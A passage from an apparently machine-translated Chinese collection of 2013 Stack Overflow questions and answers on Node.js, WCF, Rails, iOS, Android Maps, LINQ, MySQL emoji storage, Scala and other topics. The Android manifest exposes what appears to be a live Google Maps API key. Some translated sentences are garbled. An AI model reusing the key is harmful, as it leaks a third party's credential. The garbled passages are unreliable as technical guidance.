  if(!err) {
    //do an error here
  }
});

exports.db = db; 
```

我在正确范围内获取数据库时遇到问题，目前在 post.js 中调用查询时，我收到此错误：

```
 ost:findAll
TypeError: Cannot call method 'collection' of undefined
    at Object.exports.findAll (/Github/-api-v3/routes/post.js:19:10)
    at /Github/-api-v3/app.js:53:10
    at Basic.apply (/Github/-api-v3/node_modules/http-auth/lib/auth/basic.js:48:4)
    at /Github/-api-v3/app.js:51:9
    at callbacks (/Github/-api-v3/node_modules/express/lib/router/index.js:161:37)
    at param (/Github/-api-v3/node_modules/express/lib/router/index.js:135:11)
    at pass (/Github/-api-v3/node_modules/express/lib/router/index.js:142:5)
    at Router._dispatch (/Github/-api-v3/node_modules/express/lib/router/index.js:170:5)
    at Object.router (/Github/-api-v3/node_modules/express/lib/router/index.js:33:10)
    at next (/Github/-api-v3/node_modules/express/node_modules/connect/lib/proto.js:199:15) 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T19:30:51.843

每个模块都在具有自己作用域的闭包中运行。这意味着您定义的任何变量都只能在该模块中访问。任何你想让外部可见的方法或变量都应该添加到`module.exports`对象中。

如果你真的必须定义一个全局变量，你需要将它作为属性添加到`global`对象中，但这是应该保持在绝对最小值的东西。

正确的方法是在您使用的每个模块中要求任何依赖模块。所以如果你想引用下划线，`var _ = require("underscore");`你应该这样做。`post.js``_`

如果您需要`post.js`了解您的`app`实例，您应该将其作为参数传递给`module.exports`对象中可用的函数`post.js`。

**post.js**

```
// Module dependencies
const _ = require("underscore");

// placeholder for app instance
var app;

// add a use function to exports that 
// we can access from our app
exports.use = function (appInstance) {
    // make app instance available in post.js
    app = appInstance;
    // app.db is also accessible
}

// add the rest of the methods here 
```

**应用程序.js**

```
// Module dependencies
const express = require('express');
const auth = require('http-auth');
const _ = require('underscore');
const expressValidator = require('express-validator');
const post = require('./routes/post');

// create app instance
var app = express();

// require db into app.db
app.db = require("./db");

// pass app as an argument to the use method
post.use(app); 
```

*注意：我更喜欢将 const 用于依赖项，以便更容易与普通变量/实例区分开来。另请注意，这`exports`是`module.exports`.*

# asp.net-mvc - MVC 4 - 在数据层中使用 WCF

> ID：14220371
> 
> 赞同：3
> 
> 时间：2013-01-08T17:09:02.613
> 
> 标签：asp.net-mvc, wcf, dependency-injection, data-layers

在我的测试项目中，我创建了一个 WCF 服务并让它运行。接下来，我创建了一个 MVC 4 项目。它在一种解决方案下被分成几层。

*   模型层。
*   UI/视图/控制器层
*   存储库层。

做一个快速测试：在 UI 层，我添加了一个对我的 WCF 服务的 Web 引用。在控制器中，我通过“使用”在视图中填充下拉列表来联系 WCF 服务。

但是，我正在使用依赖注入进行分离。

在存储库层中，我创建了一个带有填充下拉列表的接口并将其注入。不是问题。

我在这个概念上苦苦挣扎的是：

1.  我是否在 UI 层使用 WCF 服务并在存储库层引用它？（似乎不对）
2.  我是否要创建另一个项目 - 数据层 - 并添加对 WCF 服务的 Web 引用，然后从存储库中创建对数据层的引用？

这给我带来了另一个问题 - 如果我在单独的项目（层）中创建对 WCF 服务的 Web 引用，则与 WCF 服务有关的信息不会出现在主 config.sys 文件中......

所以我正在努力掌握这部分......我应该阅读更多内容吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-09T09:45:19.097

意识到你的蛋糕可以用多种方式切割，我在这里向你介绍我对如何切割它的看法：

问题 #1：“我是否在 UI 层使用 WCF 服务并在存储库层引用它？” 首先：正如 Steven 在您的评论中指出的那样，您应该深入考虑是否要注入第三个服务器层。UI 层可以重命名为“在 IIS 中托管的层”。这样做使它成为 MVC 表示层和服务的主机层的主机层。但是，这并不意味着您的服务是在这一层实现的，只是它们托管在这里（仅在 web.config 中引用接口和实现命名空间的问题）。

问题 #2：“我是否创建另一个项目 - 数据层 - 并添加对 WCF 服务的 Web 引用，然后从存储库中创建对数据层的引用？” 当我读到这篇文章时，您同时提出了多个问题：是的，您应该创建一个单独的层来封装存储库。不，您不应该让该层包含与 wcf 相关的任何内容。如果服务器层需要客户端访问 wcf 服务，您应该将其分成一个逻辑层，或者作为一个文件夹驻留在您的业务逻辑层中，或者作为一个单独的物理“数据适配器层”。永远不会在您的存储库层中。虽然从概念上讲 wcf 数据适配器层与存储库层处于同一级别，但您不应该在同一逻辑或物理层中混合使用数据库访问和服务访问。

第三个问题我只能作为一个问题来回答：您希望 WCF 在您的体系结构中实现的目的是什么？您是要注入单独的服务层还是将层分离与层分离混淆了？

层分离可以在进程内耦合运行时，而层分离只能通过某种在线远程处理（例如 wcf）耦合运行时。

正如 Steven 在他的评论中指出的那样，您根本没有真正记录在您的架构中使用 wcf 的必要性。

让我们从逻辑层和层次的角度来看看你的架构（切蛋糕）：

*   客户端访问层（#1，在浏览器上下文中运行）

*   Web-Host-Layer（#2，代表外部服务器层，包含所有 MVC 代码。也许 Model 存在于它自己的物理层中。

*   服务层（在您的架构中尚不存在，因为没有必要证明将层进一步抽象为层）

*   业务层（#2，表示位于表示层和数据库以及数据访问层之间的业务逻辑）

*   存储层（#2，封装数据库访问逻辑和映射）

*   服务访问层（#2，封装对外部服务的访问，可以实现为BL层的文件夹，也可以单独的物理层实现）

*   数据库层（#3，sql server）

那么您是否在问如何使用 IIS 作为主机和 C# 作为实现语言在 WCF 中实现 DI。

或者。

您是否在询问构建 n 层 .net 应用程序的一般指导。

第一个很简单，因为那里有很多例子，比如[这个](http://initializecomponent.blogspot.dk/2008/06/integrating-unity-with-wcf.html)

第二个更棘手，因为答案总是“取决于”。这取决于您的需求是什么，您的专业水平是什么，项目的预计时间跨度是多少等等。

希望这对您有所帮助。

如果您愿意，我可以将我的行为 wcf unity 的实现发送给您。

概念：

*   逻辑层 - 用于隔离责任的架构概念。层具有向下耦合，从不向上。

*   物理层 - 用于实施逻辑分离的实现结构。.net 程序集可用作物理层的实现。

*   层 - 可以存在于不托管其他层的机器上的一个或多个层。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-01-08T17:36:07.663

在我看来，您将 WCF 调用视为数据源，这使其自然适合存储库层。存储库的工作是从其他层抽象数据源实现的知识。

我建议不要使用 .NET 项目来强制执行层边界，而是使用同一项目中的文件夹来强制执行逻辑分离而不是物理分离。大多数用例不需要物理分离，它会增加复杂性，例如您提到的更困难的配置。

# ruby-on-rails - rails unit/test get ActionView::Template::Error: undefined method `name' for nil:NilClass

> ID：14220374
> 
> 赞同：0
> 
> 时间：2013-01-08T17:09:10.527
> 
> 标签：ruby-on-rails, unit-testing

我的练习项目中有一个简单的依赖项
`patients belongs_to location
location has_many patients`

我的`patients_controller.rb`档案

```
 class PatientsController < ApplicationController
    def location
       @location = Location.find(params[:id])
       place = @location.id
       @patients = Patient.where(:location_id => place)
    end

    def index
        @patients = Patient.paginate(:page => params[:page], :per_page => 20).order('id DESC')

        respond_to do |format|
        format.html
        format.json { render json: @patients }
    end
end 
```

***其他与 Rails 默认生成的相同***

我的`patients#index`档案

```
<table>
<% @patients.each do |patient| %>
   <tr>
    <td><%= patient.name %> </td>
    <td><%= patient.birthday %> </td>
    <td><%= patient.gender %></td>
    <td><%= medical_record(patient.id) %></td>
    <td><%= patient.status %></td>
    <td><%= link_to(patient.location.name, location_path(patient.location)) %> </td>
    <td><%= patient.viewed_count %></td>
   </tr>
     <td><%= link_to 'Show', patient_path(patient) %></td>
     <td><%= link_to 'Edit', edit_patient_path(patient) %></td>
     <td><%= link_to 'Destroy', patient_path(patient), :method => :delete, :confirm => 'Are YOU SURE?' %></td>
 <% end %>
</table>
    <%= link_to "create patient", new_patient_path %><hr>
    <%= link_to "Locations", locations_path %> 
```

我为控制器编写了一个单元/测试

```
require 'test_helper'

class PatientsControllerTest < ActionController::TestCase
  def setup
    @patient = patients(:one)
    @location = locations(:one)
    @patient.location_id = @location.id
  end

  test "should get index" do
    get :index
    assert_response :success
    assert_not_nil assigns(:patients)
  end

end 
```

当我运行测试时，它会返回
`1) Error:
test_should_get_index(PatientsControllerTest):
ActionView::Template::Error: undefined method `name' for nil:NilClass`

我知道它必须是`location`控制器中的方法，但我找不到解决这个问题的方法。
如何为这个控制器编写正确的测试？

- - - - - - - - - - -更新 - - - - - - - - - - - - - - --------
我改成这个

```
require 'test_helper'

class PatientsControllerTest < ActionController::TestCase
  def setup
    @patient = patients(:one)
    @location = locations(:one)
    @patient.location_id = @location.id
  end

  test "should get index" do
    get :location
    get :index
    assert_response :success
    assert_not_nil assigns(:patients)
  end

end 
```

并得到`ActionController::RoutingError: No route matches {:controller=>"patients", :action=>"location"}`

我的`routes.rb`

```
Patients::Application.routes.draw do
  resources :locations  
  resources :patients  

  root to: "locations#index"    
  match "patients/location/:id", :to => "patients#location", :as => :location_patients  
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:17:03.113

```
get :location 
```

...（以及更多文本，因为 stackoverflow 需要 30 个字符的答案。）

# ios - iOS中UITable的tableheaderview需要添加多个UI元素

> ID：14220376
> 
> 赞同：3
> 
> 时间：2013-01-08T17:09:22.080
> 
> 标签：ios, uitableview, uibutton, uilabel, nstableheaderview

我有一个具有 tableView 的 UITableViewController。对于这个 tableView，我想添加一个标签和一个按钮，但不幸的是，我只能添加一个或另一个。

这是我正在使用的代码：

```
- (void) viewDidLoad {

    [super viewDidLoad];

    selectAllButton = [UIButton buttonWithType:UIButtonTypeCustom];
    [selectAllButton setFrame:CGRectMake(280, 0, 25, 25)];
    [selectAllButton setImage:[UIImage imageNamed:@"CheckBox1.png"] forState:UIControlStateSelected];
    [selectAllButton setImage:[UIImage imageNamed:@"CheckBox2.png"] forState:UIControlStateNormal];
    [selectAllButton setUserInteractionEnabled:YES];
    [selectAllButton addTarget:self action:@selector(buttonTouched:) forControlEvents:UIControlEventTouchUpInside];

    selectAllLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 10, 300, 40)];
    [selectAllLabel setTextColor:[UIColor blackColor]];
    [selectAllLabel setBackgroundColor:[UIColor clearColor]];
    [selectAllLabel setText:@"Select All"];

    self.tableView.tableHeaderView = selectAllButton;
    self.tableView.tableHeaderView = selectAllLabel;

} 
```

当我运行上述方法时，我只能看到我的标签，它告诉我它正在替换按钮。有没有办法让两个元素都出现在 tableheaderview 中？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:14:57.870

创建一个 UIView，将您的按钮和标签作为子视图添加到其中，而不是将该视图设置为您的 self.tableview.tableHeaderView

```
...your code
UIView *headerView = [UIView alloc] initWithFrame:CGRectMake(0, 0, self.tableView.frame.size.width, selectAllButton.frame.size.height + selectAllLabel.frame.size.height)];

[headerView addSubview:selectAllButton];
[headerView selectAllLabel];

self.tableView.tableHeaderView = headerView; 
```

当您初始化按钮和标签时​​，请务必更改框架，因为它们将基于 UIView

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:18:39.090

既然`tableHeaderView`是`UIView`，请尝试添加它`addSubview:(UIView*)`或创建一个`UIView`并将其添加为您的`tableHeaderView`.

# android - Android上的Googlemaps显示灰屏

> ID：14220377
> 
> 赞同：0
> 
> 时间：2013-01-08T17:09:22.347
> 
> 标签：android, google-maps, api-key

我刚刚让我的谷歌地图应用程序在启动时不会崩溃，但现在，当它打开时，它只显示灰色/白色背景和缩放按钮。我在网上搜索，发现这可能是我的 API 密钥有问题，所以我从 google 获得了一个新密钥，但这也不起作用。

这是它的外观截图。 [链接到图片](http://s7.postimage.org/u6ntgzh3v/Screenshot_2013_01_08_17_53_00.png)（我是新用户，所以我不能在这里发布图片）

这是我的清单文件：

```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.androidbasic12"
    android:versionCode="1"
    android:versionName="1.0" 
    >
    <uses-feature
    android:glEsVersion="0x00020000"
    android:required="true"/>

<permission 
    android:name="come.example.androidbasics12.permission.MAPS_RECIEVE"
    android:protectionLevel="signature"/>

    <uses-permission      
        android:name="com.example.androidbasics12.permission.MAPS_RECEIVE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission  android:name="com.google.android.providers.gsf.permission.READ_GSERVICES"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>

    <uses-sdk
        android:minSdkVersion="14"
        android:targetSdkVersion="17" />

    <application
        android:allowBackup="true"
        android:icon="@drawable/new_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme" >
        <!-- First xml to be loaded -->
        <activity
            android:name="com.example.androidbasic12.MainActivity"
            android:label="@string/app_name" 
            android:launchMode="singleInstance"
            android:screenOrientation="portrait">

            <intent-filter>
                <action android:name="android.intent.action.MAIN" />

                <category android:name="android.intent.category.LAUNCHER"   />
            </intent-filter>
        </activity>

        <!-- Opens main menu after splash has loaded -->
        <activity
            android:name=".myMenu"
            android:label="@string/app_name"
            android:screenOrientation="portrait"> >
            <intent-filter>
                <action android:name="com.example.androidbasic12.CLEARSCREEN" />

                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>

        <!-- Opens test -->
        <activity
            android:name=".tutOne"
            android:label="@string/app_name"
            android:screenOrientation="portrait"> >
            <intent-filter>
                <action android:name="com.example.androidbasic12.TUTONE" />

                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
        </activity>

        <!-- Opens map page -->
        <activity
            android:name=".map"
            android:label="@string/app_name"
            android:screenOrientation="portrait"> >
            <intent-filter>
                <action android:name="com.example.androidbasic12.MAPS" />

                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </activity>

    <meta-data
        android:name="com.google.android.maps.v2.API_KEY"
        android:value="AIzaSyBcMOBc8WVLUIRUfs0Zgap3cnhwm4dWLag"/>

    </application>

</manifest> 
```

有人对此有任何提示吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:15:45.457

我和你有同样的问题，在模拟器上一切正常，但在真实设备上它是灰色的表面，带有缩放按钮。然后我尝试了其他设备，它可以工作。所有其他手机都有原始（库存）固件，只有我有一个带有自定义固件。

首先检查模拟器上的一切是否正常，然后使用库存固件检查设备并让我们知道结果。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:13:09.707

问题可能不在于您的 API 密钥，而在于 API 控制台中的授权应用程序。确保您使用 Google API 控制台注册了正确的密钥和包名称。具体来说，如果您直接从 eclipse 编译和启动，您可能正在登录[debug mode](http://developer.android.com/tools/publishing/app-signing.html#debugmode)。如果是这样，您需要将调试密钥哈希 + 包名称添加到 API 控制台中允许的应用程序。

# ruby-on-rails - 创建我自己的 rake test:foo 任务

> ID：14220380
> 
> 赞同：0
> 
> 时间：2013-01-08T17:09:34.250
> 
> 标签：ruby-on-rails, rake

我有一堆不是单元或功能测试的测试，它们的格式`test/foo/special_test.rb`

我想创建一个这样的 rake 任务`rake test:units`，它将运行`foo`文件夹中的所有测试。我该怎么做呢？

**编辑**：我实际上想`rake test:foo`与 有点不同`rake test:units`，因为我*不*希望它在我简单地运行时运行`rake test`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:22:32.823

我不记得这是从哪里来的，所以很遗憾我不能给予适当的确认，但这应该可以。我说“应该”是因为我已经停止使用它，而是从我的 git 历史记录中获取它。

```
# First, 'reopen' the default :test namespace and create your custom task.
namespace :test do
  Rake::TestTask.new(:foo_tests => ["test:prepare", "other_dependent_rake_tasks"] ) do |t|
    DatabaseCleaner.strategy = :transaction # If using this.

    t.libs << "test"
    # Will also get subfolders within test/foo
    t.test_files = FileList['test/foo/**/*_test.rb', 'test/foo/*_test.rb']
  end
end 
```

您可以删除默认的“测试”任务并重新定义它，以便在运行时`rake test`它也会自动运行`rake test:foo_tests`。

```
remove_task "test"

desc 'Adding onto Rails regular tests'
task :test do
  # Add all the names of tests you want run here.
  errors = %w(test:units test:functionals test:integration test:foo_tests).collect do |task|
    begin
      puts "Running: #{task}"
      Rake::Task[task].invoke
      nil
    rescue => e
      task
    end
  end.compact
  abort "Errors running #{errors * ', '}!" if errors.any?
end 
```

# c# - 找不到适合 Linq 查询的运算符

> ID：14220383
> 
> 赞同：3
> 
> 时间：2013-01-08T17:09:49.723
> 
> 标签：c#, linq, c#-4.0, linq-to-objects

我需要帮助构建 Linq 查询。我有这本字典：

```
var dict = new Dictionary<string, IDictionary<int, double>>  
{  
    { "one", new Dictionary<int, double>  
        {  
            { 1, 2.0 },  
            { 2, 3.0 }  
        }},  
    { "two", new Dictionary<int, double>  
        {  
            { 1, 3.0 },  
            { 2, 4.0 },  
            { 3, 5.0 }  
        }},  
    { "three", new Dictionary<int, double>  
        {  
            { 1, 4.0 },  
            { 2, 5.0}  
        }}  
    }; 
```

我想选择关联值为 3.0 的所有“字符串”/“整数”元组。使用 Foreach 循环，它看起来像：

```
var res = new Dictionary<string, int>();
foreach (var elem in dict.Select (d => new { S = d.Key, I = d.Value }))
{
    foreach (var val in elem.I)
    {
        if (val.Value == 3.0)
        {
            res.Add(elem.S, val.Key);
        }
    }
} 
```

我正在尝试对单个 Linq 查询执行相同的操作，但没有成功（我不知道如何将键与子查询中的值“连接”）。你会怎么做？

先感谢您！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:16:28.260

这是另一种丑陋的方法：

```
var results = from key1 in dict.Keys
              let valueDict = dict[key1]
              from key2 in valueDict.Keys
              where valueDict[key2] == 3d
              select new { Key1 = key1, Key2 = key2 }; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-08T17:55:38.503

你可以这样做：

```
var result = dict
    // flatten to 3-value tuple
    .SelectMany(kvp => kvp.Value
        .Select(kvp2 => new // anonymous object
        {
            OuterKey = kvp.Key, // e.g. "one"
            InnerKey = kvp2.Key, // e.g. 1
            InnerValue = kvp2.Value // e.g. 2.0
        })
    ).Where(o => o.InnerValue == 3.0) // limit to the 3.0 value
    .ToDictionary(o => o.OuterKey, o => o.InnerKey)
    ; 
```

SelectMany 将字典扁平化为如下结构：

```
{ OuterKey = "one", InnerKey = 1, InnerValue = 2.0 },
{ OuterKey = "one", InnerKey = 2, InnerValue = 3.0 },
{ OuterKey = "two", InnerKey = 1, InnerValue = 3.0 },
{ OuterKey = "two", InnerKey = 2, InnerValue = 4.0 },
{ OuterKey = "two", InnerKey = 3, InnerValue = 5.0 },
{ OuterKey = "three", InnerKey = 1, InnerValue = 4.0 },
{ OuterKey = "three", InnerKey = 2, InnerValue = 5.0 } 
```

Where() 将其限制为仅具有 InnerValue = 3.0 的对象：

```
{ OuterKey = "one", InnerKey = 2, InnerValue = 3.0 },
{ OuterKey = "two", InnerKey = 1, InnerValue = 3.0 } 
```

ToDictionary() 看起来像这样：

```
{ "one", 2 },
{ "two", 1 } 
```

如果同一外键下可能有多个 3.0，则可以使用 ToLookup() 代替 ToDictionary()。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-01-08T17:12:20.463

这可以解决问题：

```
var  res = dict
        .Where(outer => outer.Value.Any(inner => inner.Value == 3.0))
        .ToDictionary(outer => outer.Key, outer => outer.Value.First(x=>x.Value == 3.0).Key); 
```

或使代码更通用：

```
var predicate = new Func<KeyValuePair<int, double>, bool>(inner => inner.Value == 3.0); 
var  res = dict
        .Where(outer => outer.Value.Any(inner => predicate(inner)))
        .ToDictionary(outer => outer.Key, outer => outer.Value.First(inner => predicate(inner)).Key); 
```

# ruby - Ruby win32-api GetFocus 和 GetWindowText

> ID：14220386
> 
> 赞同：4
> 
> 时间：2013-01-08T17:09:55.143
> 
> 标签：ruby, winapi

我试图找到一种方法来获取当前窗口的文本。[因此，我使用 win32-api gem 使用此页面](https://bitbucket.org/thomthom/tt-library-2/src/5fb374db1bd1/TT_Lib2/win32.rb)的一些帮助编写了此代码

```
require 'win32/api'
include Win32
hWnd = GetActiveWindow = API.new('GetActiveWindow', 'V', 'L', 'user32').call
GetWindowText       = API.new('GetWindowText', 'LPI', 'I', 'user32')
GetWindowTextLength = API.new('GetWindowTextLength', 'L', 'I', 'user32')
buf_len = GetWindowTextLength.call(hwnd)
str = ' ' * (buf_len + 1)
# Retreive the text.
result = GetWindowText.call(hwnd, str, str.length)
puts str.strip 
```

输出只是一个空字符串，因为由于 hwnd 设置为 0，buf_len 始终计算为 0。我无法弄清楚为什么返回的 hwnd 始终只是 0。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T19:15:52.120

如前所述`GetActiveWindow`，只会检索附加到调用线程的消息队列的窗口。如果您想获取用户当前所在窗口的句柄，而不管它在哪个进程中运行，请尝试调用[GetForegroundWindow](http://msdn.microsoft.com/en-us/library/ms633505%28v=vs.85%29.aspx)而不是`GetActiveWindow`.

> 检索前台窗口（用户当前正在使用的窗口）的句柄。

# css - CodeIgniter：如何从帮助程序中将 css 链接标签添加到 html 页面的头部

> ID：14220389
> 
> 赞同：0
> 
> 时间：2013-01-08T17:10:03.970
> 
> 标签：css, codeigniter, codeigniter-helpers

我有一个辅助方法，它可以呈现一些 html 以及所需的**css**和**js**链接。我只是连接所有的 html 标签并返回构建的字符串。辅助方法是这样的：

```
function display_linkPreview($data = array())
{
    $return = "<link rel=\"stylesheet\" class=\"cssStatics\" type=\"text/css\" href=".base_url()."assets/css/stylesheet.css\" />
        <script type=\"text/javascript\" src=".base_url()."assets/js/linkPreview.js\" ></script>
        <div>blah blah<div></div></div>";
    return $return;
} 
```

这就是我要`display_linkPreview`在其中一个视图中呈现输出的方式：

```
echo display_linkPreview($body); 
```

问题是所有的输出`display_linkPreview`，包括`<link>`和`<script>`标签都将呈现在我调用的 HTML 页面的中间`echo`。如何修改以向html`display_linkPreview`添加`css`和`js`标记？`<head>`

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T18:44:50.643

您可以使用模板样式查看，例如，您有`main.php`

```
<html>
.
.
<?php echo $linkPreview ; ?>
</html>

<body>
.
.
<div id='main'><?php $this->load($main); ?></div>
</body> 
```

您的控制器可能如下所示：

```
.
.
$data['main'] = "myview";
$data['linkPreview'] = display_linkPreview();

$this->load->vars($data);
$this->load->view('template/main'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-07-21T04:15:10.367

试试这个`link_tag`。这将帮助您链接 css 和 js。像这样的东西。

```
<html>
<head>
    <title></title>
    <?php echo link_tag('resources/style.css');?>
</head>
<body>
<?php 
?>
</body>
</html> 
```

这`resources`是包含 css 文件的文件夹`stlye`

# javascript - 我无法让 checkbox.checked 工作

> ID：14220396
> 
> 赞同：-2
> 
> 时间：2013-01-08T17:10:21.543
> 
> 标签：javascript, html, forms

我似乎无法让 checkbox.checked 工作，我有一个脚本可以更改基于 onclick() 的图像，但是我希望它根据是否选中复选框来更改它。我究竟做错了什么？此外，如果有人能够解决此问题，则复选框不会在 ie8 中检查

这是实时链接：http: [//jsbin.com/uburan/1/edit](http://jsbin.com/uburan/1/edit)

代码：

```
<script type="text/javascript">
function func()
{
    var img1= document.getElementById("img1");

    if(checkbox.checked)
    {
        img1.src = "images/" + "img1a.jpg";
        img1.name = "off";
    }
    else
    {
        img1.src = "images/" + "img1.jpg";
        img1.name = "on";
    }
}
</script>

</head>

<body>
<form>
<p align="center">
<input type="checkbox" name="interest1" id="interest1" value="x">
<input type="checkbox" name="interest2" id="interest2" value="x">
<input type="checkbox" name="interest3" id="interest3" value="x"></p>   
<p align="center">
<label for="interest1" id="label-interest1"><img src="images/img1.jpg" width="781" height="800" onclick="func()" id="img1" /></label>
<label for="interest2" id="label-interest2"><img src="/images/img2.jpg" width="781" height="800" /></label>
<label for="interest3" id="label-interest3"><img src="/images/img3.jpg" width="781" height="800" /></label></P><!-- code making checkbox be an image-->
</form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:13:15.387

您必须指定复选框的 ID（或其在 DOM 中的引用）。像这样的东西：

```
if(document.getElementById('interest1').checked)
{
    // blah
} 
```

如果你想检查它们是否都被选中：

```
if(document.getElementById('interest1').checked && 
   document.getElementById('interest2').checked &&
   document.getElementById('interest3').checked) {

    // blah

} 
```

# r - 在 Symfony2 中执行 R 脚本

> ID：14220405
> 
> 赞同：1
> 
> 时间：2013-01-08T17:10:48.647
> 
> 标签：r, symfony, symfony-2.1, filepath, symfony-2.0

我必须（安全地）从**Symfony2**控制器执行很多**R 脚本。**我在我的一个名为. 在那里，存储了很多 R 脚本文件，例如， 要执行*Test.R*文件中的脚本，我应该在我的安全操作中编写如下内容：**`AcmeStatsBundle``RScripts``Test.R`**

 ***```
$rootdir = ...//get the path to the src folder.
exec("Rscript $rootdir/Acme/StatsBundle/RScripts/Test.R"); 
```

使用哪个命令来获取正确的值`$rootdir`？也许我错了，我应该将脚本部署在 app 文件夹中。我应该将生成的输出（例如图像）放在 web 文件夹中的什么位置？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:13:20.667

应该 ：

```
$rootdir = $this->get('kernel')->getRootDir() . '\..\src' 
```

（那些'\'是什么东西？）***

# java - .classpath 中的exported 属性有什么作用？

> ID：14220409
> 
> 赞同：14
> 
> 时间：2013-01-08T17:10:59.427
> 
> 标签：java, eclipse, maven, m2e

这个 .classpath 行中的属性有什么作用`exported`？

```
<classpathentry exported="true" kind="con" path="org.eclipse.m2e.MAVEN2_CLASSPATH_CONTAINER"/> 
```

我有一个项目，无论有没有它都可以构建和运行*良好*。那么，它有什么不同呢？

显然在我的特殊情况下（我继承的一个项目）拥有它并不重要。何时添加此属性至关重要？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-08T17:13:46.800

当它被导出时，它可用于其他 eclipse 项目。在maven中，如果你有多个相互依赖的项目，eclipse可以解析workspace内的项目。因此，当您有多个项目时，改变这一点可能会产生影响。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:13:37.563

这一行是 M2Eclipse 特有的，它基本上告诉 Eclipse 将其工件解析委托给 M2Eclipse。

# mysql - 通过 Java 从 iOS 应用程序将表情符号字符插入 MySQL DB

> ID：14220410
> 
> 赞同：2
> 
> 时间：2013-01-08T17:11:00.760
> 
> 标签：mysql, utf-8, emoji

我在 mysql 5.5.24 服务器上担任 DBA。最近，当一位用户尝试从 iPhone 登录并且其手机名称本身具有表情符号时，我们在生产中遇到了一个问题。

目前，在我们的系统中，我们有 utf8 字符集，它支持 3 个字节，但由于它的电话名称有 emoji（4 个字节），所以注册失败。

如此[链接](http://mathiasbynens.be/notes/mysql-utf8mb4#utf8-to-utf8mb4)中所述，我们尝试在我们的开发设置中重现相同的场景，但仍然面临问题：

1.  我在将 DB 中仅该列的字符集更改为 utf8mb4 后尝试过 - 没有成功
2.  我修改了将整个数据库的字符集更改为 utf8mb4 - 没有成功

Java 日志：

```
2013-01-08 11:21:54,547 ERROR [org.hibernate.util.JDBCExceptionReporter] (http-0.0.0.0) Incorrect string value: '\xF0\x9F\x98\x84' for column 'deviceDescription' at row 1 
```

数据库日志：

```
insert into deviceDetails (deviceDescription, remoteStatus, deviceStatus) values ('?', 0, 1) 
```

注意：Java 端的字符集仍然是 utf8。这可能是一个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-20T20:55:41.863

见[这里](https://stackoverflow.com/questions/7814293/how-to-insert-utf-8-mb4-characteremoji-in-ios5-in-mysql)。还要确保您的连接字符集是 utfmb4。

```
Db     characterset:    utf8mb4
Client characterset:    utf8mb4
Conn.  characterset:    utf8mb4 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-14T10:43:28.657

这是要插入的查询：

```
insert into homeDetails (homeId, homeDescription, routerMac, routerSSID, arpMac, homeDetailTS)values (123,'des','mactest',convert ('EmotRS'using utf8mb4),'aprtest', now()); 
```

# scala - Scala 数据结构：操作链（如 mapValues、filter ...）和中间结果

> ID：14220412
> 
> 赞同：3
> 
> 时间：2013-01-08T17:11:03.560
> 
> 标签：scala

考虑以下：

```
val stuff = Map[String, Int]("apple" -> 5, "orange" -> 1, "banana" -> 3, "kiwi" -> 2)

val used = 1

val rest = stuff.mapValues{
  case quantity => quantity - used
}.filterNot{
  case (fruit, quantity) => quantity == 0
} 
```

结果是

```
rest : scala.collection.immutable.Map[String,Int] = Map(apple -> 4, banana -> 2, kiwi -> 1) 
```

尽管我不是 Scala 方面的专家，但我知道该语言并不懒惰（与 Haskell 不同），因此`mapValues`会产生一个中间`Map`，然后将其作为输入传递给`filterNot`（如果链中还有其他操作） .

如何避免这种无用的中间数据结构？

注意：我知道这个问题可以推广到其他数据结构。在这里我使用了一个`Map`只是因为它是我在我的真实代码中使用的数据结构（尽管还有其他数据:)）

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-08T17:15:43.460

您可以使用`view`任何集合类的方法来创建集合的视图，该视图将应用类似`map`和`filter`惰性的方法。请参阅[http://www.scala-lang.org/archives/downloads/distrib/files/nightly/docs/library/index.html#scala.collection.TraversableLike](http://www.scala-lang.org/archives/downloads/distrib/files/nightly/docs/library/index.html#scala.collection.TraversableLike)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-09T15:20:40.340

这似乎可以解决问题：

```
object  ChainOpsRS
{
  val stuff = Map[String, Int]("apple" -> 5, "orange" -> 1, "banana" -> 3, "kiwi" -> 2)

  val used = 1

  val rest =
    stuff.collect {
      case (fruit, quantity) if quantity > used => (fruit, quantity - used)
    }

  def main(args: Array[String]) {
    printf("stuff=%s%n", stuff.mkString("{", ", ", "}"))
    printf(" rest=%s%n", rest.mkString("{", ", ", "}"))
  }
} 
```

运行时，它会产生以下输出：

```
stuff={apple -> 5, orange -> 1, banana -> 3, kiwi -> 2}
 rest={apple -> 4, banana -> 2, kiwi -> 1} 
```

* * *

## 回答 #3

